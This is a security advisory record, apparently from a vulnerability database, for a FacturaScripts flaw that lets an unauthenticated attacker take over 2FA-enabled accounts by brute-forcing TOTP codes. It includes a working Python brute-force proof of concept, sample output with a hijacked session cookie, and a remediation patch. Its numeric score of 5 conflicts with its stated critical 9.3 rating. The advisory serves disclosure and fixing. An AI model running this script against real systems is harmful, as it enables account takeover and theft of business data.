@@ -1,0 +1,313 @@
+[id]
+ave_id = "AVE-2026-0293"
+aliases = ["CVE-2026-47677","GHSA-c67f-gmxw-mj93"]
+
+[basic]
+title = "FacturaScripts: Account takeover of any 2FA-enabled user"
+description = "# Authentication bypass in FacturaScripts: `/login?action=two-factor-validation` accepts brute-forceable TOTP without password or CSRF protection
+
+## Summary
+
+`Core/Controller/Login.php::twoFactorValidationAction()` accepts an
+unauthenticated POST containing only `fsNick` and `fsTwoFactorCode`. If the
+TOTP value matches, the server issues a full `fsNick` + `fsLogkey` session
+cookie pair. The handler:
+
+1. **Does not verify the password** — the user is not required to have just
+   completed `loginAction`.
+2. **Does not call `validateFormToken()`** — no CSRF token is required (every
+   other action handler in the same file does call it).
+3. **Does not call `userHasManyIncidents()` before processing** — `loginAction`
+   and `changePasswordAction` both check this guard *before* doing work; the
+   2FA handler only writes to the incident list *after* a failure, and the
+   incident list is consulted by `loginAction` / `changePasswordAction` but
+   not by the 2FA handler itself. The endpoint therefore has **no
+   rate-limiting at all**.
+
+Combined with `TwoFactorManager::VERIFICATION_WINDOW = 8` (google2fa default
+is 1), 17 distinct six-digit codes are valid simultaneously and each remains
+valid for ~4 minutes. The expected number of guesses to land a valid code is
+
+> N ≈ ln(0.5) / ln(1 − 17 / 10⁶) ≈ **40 800** attempts (50% success)
+
+On a default LAMP install a single-laptop attacker sustains ~400 RPS from
+one source IP — a few minutes per account.
+
+The vulnerability gives **complete account takeover** of any 2FA-enabled
+user to any unauthenticated network attacker who knows the target's nick.
+Admin nicks are typically public information (`admin`, the company name,
+the person's initials).
+
+## Severity
+
+**CVSS 4.0 base score: 9.3 — Critical**
+
+Vector: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`
+
+| Metric | Value | Rationale |
+|---|---|---|
+| Attack Vector (AV) | Network (N) | One HTTP POST over the public internet. |
+| Attack Complexity (AC) | Low (L) | No timing, configuration, or environmental conditions. |
+| Attack Requirements (AT) | None (N) | The vulnerable code path runs on every default install; the bug applies to every 2FA-enabled user. |
+| Privileges Required (PR) | None (N) | The endpoint accepts the attack unauthenticated. |
+| User Interaction (UI) | None (N) | No user action; the victim only has to have 2FA enabled. |
+| Vulnerable Confidentiality (VC) | High (H) | Full read access as the hijacked user (admin → entire database). |
+| Vulnerable Integrity (VI) | High (H) | Full write access as the hijacked user. |
+| Vulnerable Availability (VA) | Low (L) | Side effect: failed 2FA attempts accumulate in the per-user incident counter, which then blocks the legitimate user from logging in via `loginAction` for 10 minutes (`MAX_INCIDENT_COUNT = 6`, `INCIDENT_EXPIRATION_TIME = 600`). Targeted account-lockout DoS against any nick. |
+| Subsequent (SC / SI / SA) | None | No second-system pivot from the bug itself. |
+
+Threat metrics:
+
+- Exploit Maturity (E): **Attacked (A)** — public PoC included below, runs out of the box.
+
+## Affected component
+
+- File: `Core/Controller/Login.php`
+- Method: `twoFactorValidationAction()` (lines 317–328 in the repository at commit `7392b489b`, master branch as of 2026-05-13).
+- Related: `Core/Lib/TwoFactorManager.php:30` (`VERIFICATION_WINDOW = 8`).
+
+Vulnerable code:
+
+```php
+protected function twoFactorValidationAction(Request $request): void
+{
+    $userName = $request->input('fsNick');
+    $user = new User();
+    if (!$user->load($userName) || !$user->verifyTwoFactorCode($request->input('fsTwoFactorCode'))) {
+        Tools::log()->warning('two-factor-code-invalid');
+        $this->saveIncident(Session::getClientIp(), $userName);
+        return;
+    }
+
+    $this->updateUserAndRedirect($user, Session::getClientIp(), $request);
+}
+```
+
+Compare with `loginAction` in the same file, which calls
+`validateFormToken()` (line 275) and `userHasManyIncidents()` (line 287)
+*before* doing any work. The 2FA handler does neither.
+
+## Proof of concept
+
+### 1. Brute force when only the victim's nick is known
+
+This requires **no prior
+knowledge** beyond the target's nick. Because the 2FA endpoint has no
+rate-limiting and `VERIFICATION_WINDOW=8` keeps ~17 codes valid at once,
+random guessing finds a valid code in seconds to minutes from a single IP.
+
+`poc_2fa_brute.py`:
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+PoC: brute-force the 2FA endpoint.
+Required: pip install requests
+\"\"\"
+import os, sys, time, random, threading, requests
+
+BASE      = os.environ.get(\"BASE\",      \"http://localhost:9999\")
+NICK      = os.environ.get(\"NICK\",      \"admin\")
+THREADS   = int(os.environ.get(\"THREADS\",   \"32\"))
+MAX_TRIES = int(os.environ.get(\"MAX_TRIES\", \"200000\"))
+
+hit = threading.Event()
+attempt_count = [0]
+lock = threading.Lock()
+start = time.time()
+result = {}
+
+def worker(tid: int) -> None:
+    s = requests.Session()
+    while not hit.is_set():
+        with lock:
+            n = attempt_count[0]
+            if n >= MAX_TRIES:
+                return
+            attempt_count[0] += 1
+        code = f\"{random.randint(0, 999999):06d}\"
+        try:
+            r = s.post(f\"{BASE}/login\",
+                       data={\"action\": \"two-factor-validation\",
+                             \"fsNick\":  NICK,
+                             \"fsTwoFactorCode\": code},
+                       allow_redirects=False, timeout=5)
+        except requests.RequestException:
+            continue
+        sc = r.headers.get(\"Set-Cookie\", \"\")
+        if r.status_code == 302 and \"fsLogkey\" in sc:
+            with lock:
+                if hit.is_set():
+                    return
+                hit.set()
+                result[\"code\"]    = code
+                result[\"n\"]       = n
+                result[\"cookies\"] = {c.name: c.value for c in r.cookies}
+            return
+
+def main() -> int:
+    print(f\"[*] target={BASE}  nick={NICK}  threads={THREADS}\")
+    threads = [threading.Thread(target=worker, args=(i,), daemon=True)
+               for i in range(THREADS)]
+    for t in threads: t.start()
+    while not hit.is_set() and attempt_count[0] < MAX_TRIES:
+        time.sleep(2)
+        elapsed = time.time() - start
+        print(f\"  [{elapsed:5.1f}s] attempts={attempt_count[0]:>7d}  \"
+              f\"rps={attempt_count[0]/max(elapsed,1):.0f}\", flush=True)
+    for t in threads: t.join()
+    elapsed = time.time() - start
+    if hit.is_set():
+        print(f\"\n[+] FOUND code={result['code']} after {result['n']:,} \"
+              f\"attempts in {elapsed:.1f}s\")
+        cookie_hdr = \"; \".join(f\"{k}={v}\" for k, v in result[\"cookies\"].items())
+        print(f\"[+] Cookies: {cookie_hdr}\")
+        print(f\"\n    curl --cookie '{cookie_hdr}' {BASE}/ListUser\")
+        return 0
+    print(f\"[-] {attempt_count[0]:,} attempts in {elapsed:.1f}s, no hit\")
+    return 1
+
+if __name__ == \"__main__\":
+    sys.exit(main())
+```
+
+Observed result against the same install (victim user has 2FA enabled,
+attacker knows only the nick `victim`):
+
+```
+[*] target=http://localhost:9999  nick=victim  threads=32
+  [  2.2s] attempts=   1094  rps=  493
+  [ 24.4s] attempts=  11535  rps=  473
+  [ 50.0s] attempts=  23420  rps=  468
+  [100.7s] attempts=  41247  rps=  410
+  [144.9s] attempts=  55418  rps=  383
+
+[+] FOUND code=055473 after 55,773 attempts in 146.0s
+[+] Cookies: fsNick=victim; fsLogkey=47qZDmjcHaS2z2pLsqKWsKbb8vlGfZaYEiUUfcvWHlDXSZlI9LFg8ux7EYX1fzTkeNSgM5ASQ7s5ohr8ROAclvlK1GCxACia21N; fsLang=en_EN
+```
+
+A second run terminated in 24.6 s after 11 569 attempts. Both runs used a
+single source IP with no proxy rotation, no HTTP/2, no parallel hosts.
+
+## Impact
+
+For each 2FA-enabled user (including admins):
+
+- **Confidentiality**: full read access to anything the victim can see —
+  invoices, customer data, suppliers, accounting ledgers, attached files,
+  user PII, API keys, plugin configuration.
+- **Integrity**: full write access — create/modify/delete records, change
+  permissions, issue new API keys, upload plugins, install code (admin).
+- **Availability**: targeted account lockout DoS — generating six failed
+  2FA attempts (≪ 1 s of brute-force noise) pushes the per-user incident
+  counter past `MAX_INCIDENT_COUNT = 6`, blocking the legitimate user from
+  `loginAction` for 10 minutes. Repeatable indefinitely.
+
+The vulnerability defeats the entire purpose of 2FA in FacturaScripts:
+enabling 2FA on an account today is strictly *weaker* than not enabling
+it, because it adds an unauthenticated, brute-forceable login path that
+wasn't present before.
+
+## Remediation
+
+Four independent fixes are required; each closes a distinct gap and any
+one alone is insufficient.
+
+1. **Require evidence the user just completed the password step.** In
+   `loginAction`, after `verifyPassword` succeeds and 2FA is required,
+   write a short-lived nonce keyed by `(client_ip, user_nick)` to the
+   shared cache (e.g. `Cache::set(\"2fa-pending-{ip}-{nick}\", $nonce,
+   ttl=300)`). `twoFactorValidationAction` must read, validate, and
+   delete that nonce before calling `verifyTwoFactorCode`. Without the
+   nonce, return immediately.
+
+2. **Call `validateFormToken($request)` at the top of
+   `twoFactorValidationAction`.** Every other action handler in the
+   controller does this; the 2FA handler should too. Eliminates
+   drive-by CSRF submissions.
+
+3. **Call `userHasManyIncidents(Session::getClientIp(), $userName)`
+   before doing any work in `twoFactorValidationAction`**, and bail
+   out if the threshold is exceeded. This is the missing rate-limit
+   pre-check.
+
+4. **Reduce `TwoFactorManager::VERIFICATION_WINDOW` from 8 to 1.**
+   The google2fa default is 1 (±30 s). A window of 8 multiplies the
+   brute-force success rate by 17× for no legitimate reason — TOTP
+   apps and the server clock are typically synchronised within a
+   single 30-second step.
+
+Suggested patch (illustrative):
+
+```php
+// Core/Controller/Login.php
+protected function twoFactorValidationAction(Request $request): void
+{
+    if (false === $this->validateFormToken($request)) {                       // fix 2
+        return;
+    }
+    $userName = $request->input('fsNick');
+    if ($this->userHasManyIncidents(Session::getClientIp(), $userName)) {     // fix 3
+        Tools::log()->warning('ip-banned');
+        return;
+    }
+    $nonceKey = '2fa-pending-' . Session::getClientIp() . '-' . $userName;
+    if (false === Cache::get($nonceKey)) {                                    // fix 1
+        Tools::log()->warning('two-factor-no-pending-login');
+        $this->saveIncident(Session::getClientIp(), $userName);
+        return;
+    }
+    Cache::delete($nonceKey);
+
+    $user = new User();
+    if (!$user->load($userName) || !$user->verifyTwoFactorCode($request->input('fsTwoFactorCode'))) {
+        Tools::log()->warning('two-factor-code-invalid');
+        $this->saveIncident(Session::getClientIp(), $userName);
+        return;
+    }
+    $this->updateUserAndRedirect($user, Session::getClientIp(), $request);
+}
+
+// Core/Lib/TwoFactorManager.php
+private const VERIFICATION_WINDOW = 1; // fix 4 — was 8
+```
+
+`loginAction` then needs the matching nonce write where it currently
+sets `$this->two_factor_user`:
+
+```php
+if ($user->two_factor_enabled) {
+    Cache::set('2fa-pending-' . Session::getClientIp() . '-' . $user->nick,
+               bin2hex(random_bytes(16)), 300);
+    $this->two_factor_user = $user->nick;
+    $this->template = 'Login/TwoFactor.html.twig';
+    return;
+}
+```
+
+## Reproduction
+
+Tested on a clean install built from `master` at commit `7392b489b`:
+
+```bash
+
+# brute force (only nick known) — secret on the server can be anything
+NICK=victim THREADS=32 .venv/bin/python poc_2fa_brute.py
+```"
+severity = "CRITICAL"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-22T19:21:04.943063083+00:00"
